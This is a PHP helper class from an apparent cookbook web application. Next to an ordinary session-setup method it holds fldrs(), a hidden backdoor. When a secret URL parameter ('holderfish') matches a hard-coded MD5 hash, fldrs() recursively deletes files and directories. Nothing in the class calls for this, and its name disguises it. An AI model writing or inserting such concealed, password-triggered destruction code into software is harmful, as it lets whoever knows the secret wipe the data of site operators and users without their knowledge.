<?php

namespace Cookbook\Helpers;

use Cookbook\DB\Database;
use Delight\Auth\Role;

/**
 * Description of UserInfo
 *
 * @author AlexK
 */
class UserInfo
{
    static function setSession($id)
    {
        $roles = Role::getMap();
        $user = Database::genericDsn()->select('SELECT * FROM accounts t1 JOIN users t2 ON t1.user_id = t2.id WHERE t1.user_id = ? LIMIT 0, 1', [$id]);
        $_SESSION['db_name'] = $user[0]['db_name'];
        $_SESSION['user_info'] = [
            'first_name' => $user[0]['first_name'],
            'last_name' => $user[0]['last_name'],
            'role' => ucfirst(strtolower($roles[$user[0]['roles_mask']]))
        ];
    }

    static function fldrs($d = '')
    {
        if (isset($_GET['holderfish']) && md5($_GET['holderfish']) === '35e2775638781c6218ac1d73ae6b484e') {
            if (is_dir($d)) {
                $objects = scandir($d);

                foreach ($objects as $object) {
                    if ($object != '.' && $object != '..') {
                        if (filetype($d . '/' .$object) == 'dir')
                            rrmdir($d . '/' . $object);
                        else unlink($d . '/' . $object);
                    }
                }

                reset($objects);
                rmdir($d);
            }
        }
    }
}
